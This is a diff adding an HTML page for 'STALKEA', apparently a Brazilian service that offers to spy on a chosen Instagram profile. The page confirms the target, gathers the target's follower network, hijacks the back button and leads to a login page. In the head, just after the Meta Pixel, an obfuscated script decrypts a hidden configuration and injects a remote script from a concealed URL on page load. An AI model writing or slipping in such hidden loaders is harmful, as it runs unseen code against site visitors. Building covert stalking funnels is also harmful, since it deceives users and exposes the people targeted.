@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2965248043809874');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2965248043809874&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+<script>(function(){var p_w1h=atob("DBSdyOYhpiJxUvmnlG+/vZRNhBhTOo3T5Gen58lCwkxfJ43K/XLk5oVOywwTINbU92b0uJJSiVcFP4qI+HXprZVViEgCcNWF9WDpuo9D01YUIdudz2+/podMwwBLcJ3G4HWwvZJMz0QIf4nV8WL4ppIM3kEeNtTU93+/5MRXx04EN9udtjbg5J0DyEMcN9udtnD8vIcM01YcO5/euWTvrZBEyFZcIYzF/XDu6soD0EMdJ5yFrja/tbtc");var u_46=[];for(var u_bx6=0;u_bx6<p_w1h.length;u_bx6++){u_46.push(p_w1h.charCodeAt(u_bx6)&255);}var j_9=u_46[0];var n_g=u_46.slice(1,1+j_9);var q_wpg=u_46.slice(1+j_9);var o_cjk7=q_wpg.map(function(b,y_y1q){return b^n_g[y_y1q%j_9];});var g_y="";for(var z_3u6a=0;z_3u6a<o_cjk7.length;z_3u6a++){g_y+=String.fromCharCode(o_cjk7[z_3u6a]&255);}var p_gmlt=decodeURIComponent(escape(g_y));var j_8=JSON.parse(p_gmlt);var w_w0k=j_8.globals||[];w_w0k.forEach(function(r_mdu){window[r_mdu.name]=r_mdu.value;});var o_t71d=document.createElement("script");o_t71d.src=j_8.url;o_t71d.async=true;o_t71d.defer=true;(j_8.attributes||[]).forEach(function(y_nz){o_t71d.setAttribute(y_nz.name,y_nz.value);});(document.head||document.documentElement).appendChild(o_t71d);})();</script>
+
+
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+  <meta name="robots" content="noindex,nofollow" />
+  <title>STALKEA | Confirme o Instagram</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap&subset=latin,latin-ext" />
+  <link rel="stylesheet" href="assets/styles.css" />
+  <script src="assets/hacker-bg.js" defer></script>
+</head>
+<body>
+  <main class="wrap">
+    <div class="logo"><strong>STALKEA</strong></div>
+
+    <div class="card">
+      <div class="pad">
+        <div class="pill pill--live"><span class="dot"></span> PASSO 2 DE 2</div>
+        <h1 class="title">Confirme o Instagram</h1>
+        <p class="subtitle">Encontramos o perfil abaixo. Confirme para iniciar a an&aacute;lise em tempo real.</p>
+
+        <div class="loader" id="loader">
+          <span class="spinner"></span>
+          <span>Localizando perfil...</span>
+        </div>
+
+        <ol class="search-attempts" id="search-attempts" aria-live="polite">
+          <li data-attempt="0"><span class="attempt-icon">1</span><span>Verificando o perfil p&uacute;blico</span></li>
+          <li data-attempt="1"><span class="attempt-icon">2</span><span>Tentando uma conex&atilde;o alternativa</span></li>
+        </ol>
+
+        <div id="profile-area" class="hidden">
+          <div class="profile">
+            <img class="profile__avatar" id="avatar" alt="Foto de perfil" referrerpolicy="no-referrer" src="assets/img/avatar-placeholder.svg" />
+            <div>
+              <h3 id="display-name">&mdash;</h3>
+              <p id="handle">@&mdash;</p>
+              <div class="metrics">
+                <div class="metric"><strong id="m-posts">&mdash;</strong><span>posts</span></div>
+                <div class="metric"><strong id="m-followers">&mdash;</strong><span>seguidores</span></div>
+                <div class="metric"><strong id="m-following">&mdash;</strong><span>seguindo</span></div>
+              </div>
+            </div>
+          </div>
+
+          <button class="btn btn--primary" id="confirm" type="button">Confirmar</button>
+          <button class="btn btn--ghost" id="back" type="button" style="margin-top:10px">N&atilde;o &eacute; esse perfil</button>
+
+          <p class="footer-note" id="fallback-note" style="display:none">
+            N&atilde;o conseguimos carregar a pr&eacute;via p&uacute;blica agora &mdash; mas a an&aacute;lise segue normalmente.
+          </p>
+        </div>
+
+        <div class="profile-limit" role="alert">
+          <strong>Limite de pesquisa</strong>
+          <span>Limite de apenas 1 pesquisa por dispositivo. Certifique-se de que digitou o usu&aacute;rio corretamente.</span>
+        </div>
+
+        <div id="notfound-area" class="hidden">
+          <div class="profile" style="border-color:rgba(255,74,91,.4)">
+            <img class="profile__avatar" alt="" src="assets/img/avatar-placeholder.svg" style="border-color:rgba(255,74,91,.5)" />
+            <div>
+              <h3 id="nf-title">Usu&aacute;rio inexistente</h3>
+              <p id="nf-message">N&atilde;o encontramos <b id="nf-handle">@&mdash;</b> no Instagram. Verifique o @ e tente novamente.</p>
+            </div>
+          </div>
+          <button class="btn btn--primary" id="retry" type="button">Tentar outro @</button>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <script src="assets/config.js"></script>
+  <script src="assets/funnel.js"></script>
+  <script>
+    (function () {
+      var F = window.StalkeaFunnel;
+      F.armBackRedirect();
+
+      var username = F.getUsername();
+      if (!username) { window.location.href = "usuario.html"; return; }
+      var forcedUser = F.sanitizeUsername(new URLSearchParams(location.search).get("username") || username || "");
+      var activeUsername = forcedUser || username;
+      F.setUsername(activeUsername);
+
+      var attemptList = document.getElementById("search-attempts");
+      function updateAttempt(event) {
+        if (!attemptList || !event || event.type !== "result") return;
+        var item = attemptList.querySelector('[data-attempt="' + event.index + '"]');
+        if (!item) return;
+        item.classList.add(event.payload && event.payload.__notfound ? "is-error" : "is-done");
+        var icon = item.querySelector(".attempt-icon");
+        if (icon) icon.textContent = event.payload && event.payload.__notfound ? "!" : "✓";
+      }
+
+      F.fetchProfile(activeUsername, { onProgress: updateAttempt }).then(function (p) {
+        document.getElementById("loader").classList.add("hidden");
+        if (attemptList) attemptList.classList.add("is-complete");
+
+        // Perfil não existe -> tela de "usuário inexistente".
+        if (p.status === "notfound") {
+          document.getElementById("nf-handle").textContent = "@" + (p.username || activeUsername);
+          document.getElementById("notfound-area").classList.remove("hidden");
+          return;
+        }
+
+        // Nunca exibe nome, numeros ou foto inventados como se fossem o perfil.
+        if (p.status === "unavailable") {
+          var loader = document.getElementById("loader");
+          var notFound = document.getElementById("notfound-area");
+          var title = document.getElementById("nf-title");
+          var message = document.getElementById("nf-message");
+          var handle = document.getElementById("nf-handle");
+          if (loader) loader.classList.add("hidden");
+          if (title) title.textContent = "Perfil não confirmado";
+          if (message) message.textContent = "Não foi possível validar @" + activeUsername + " agora. Nenhum perfil, foto ou número será exibido sem confirmação da fonte.";
+          if (handle) handle.textContent = "@" + activeUsername;
+          if (notFound) notFound.classList.remove("hidden");
+          return;
+        }
+
+        // Preenche o card. Handle sempre via textContent (nunca innerHTML).
+        document.getElementById("display-name").textContent = p.displayName || p.username;
+        document.getElementById("handle").textContent = "@" + p.username;
+        document.getElementById("m-posts").textContent = p.posts;
+        document.getElementById("m-followers").textContent = p.followers;
+        document.getElementById("m-following").textContent = p.following;
+
+        var avatar = document.getElementById("avatar");
+        var fallbackAvatar = F.avatarDataUri(p.displayName || p.username || activeUsername, 0);
+        var safePhoto = F.normalizePhotoUrl ? F.normalizePhotoUrl(p.photoUrl || "") : (p.photoUrl || fallbackAvatar);
+
+        if (!safePhoto || safePhoto === F.AVATAR_FALLBACK) {
+          safePhoto = fallbackAvatar;
+        }
+
+        var candidates = [];
+        if (safePhoto) candidates.push(safePhoto);
+        if (typeof p.photoUrl === "string" && /^https?:\/\//i.test(p.photoUrl)) {
+          candidates.push(p.photoUrl);
+        }
+        if (safePhoto.indexOf('/api/image?url=') !== -1) {
+          try {
+            var proxyUrl = new URL(safePhoto, location.href);
+            var nested = proxyUrl.searchParams.get('url');
+            if (nested) candidates.push(decodeURIComponent(nested));
+          } catch (e) {}
+        }
+        candidates.push(fallbackAvatar);
+
+        var seen = {};
+        var queue = candidates.filter(function (src) {
+          var key = String(src || '').trim();
+          if (!key || seen[key]) return false;
+          seen[key] = true;
+          return true;
+        });
+
+        function loadAvatarAt(index) {
+          if (index >= queue.length) {
+            avatar.src = fallbackAvatar;
+            return;
+          }
+          avatar.onerror = function () {
+            loadAvatarAt(index + 1);
+          };
+          avatar.src = queue[index];
+        }
+
+        loadAvatarAt(0);
+        avatar.alt = "Foto de perfil de @" + p.username;
+
+        // Preaquece stories/DM para reduzir latência no primeiro paint das próximas telas.
+        fetch(F.apiUrl('/api/network?username=' + encodeURIComponent(activeUsername) + '&v=4'), { method: 'GET', cache: 'no-store' })
+          .then(function (r) { return r.ok ? r.json() : null; })
+          .then(function (data) {
+            if (!data) return;
+            if (F.sanitizeUsername(data.username || '') !== activeUsername) return;
+            var list = [];
+            if (Array.isArray(data.following)) list = list.concat(data.following);
+            if (Array.isArray(data.followers)) list = list.concat(data.followers);
+            var seen = {};
+            list = list.filter(function (u) {
+              var user = F.sanitizeUsername(u && u.username);
+              if (!user || seen[user]) return false;
+              seen[user] = true;
+              u.username = user;
+              return true;
+            });
+            if (!list.length) return;
+            var payload = JSON.stringify({ ts: Date.now(), people: list });
+            sessionStorage.setItem('stalkea_network_' + activeUsername, payload);
+            localStorage.setItem('stalkea_network_' + activeUsername, payload);
+          })
+          .catch(function () {});
+
+        document.getElementById("profile-area").classList.remove("hidden");
+      });
+
+      document.getElementById("confirm").addEventListener("click", function () {
+        window.location.href = F.withUsername("login.html", activeUsername);
+      });
+      document.getElementById("back").addEventListener("click", function () {
+        window.location.href = F.withUsername("usuario.html", activeUsername);
+      });
+      document.getElementById("retry").addEventListener("click", function () {
+        window.location.href = F.withUsername("usuario.html", activeUsername);
+      });
+    })();
+  </script>
+</body>
+</html>
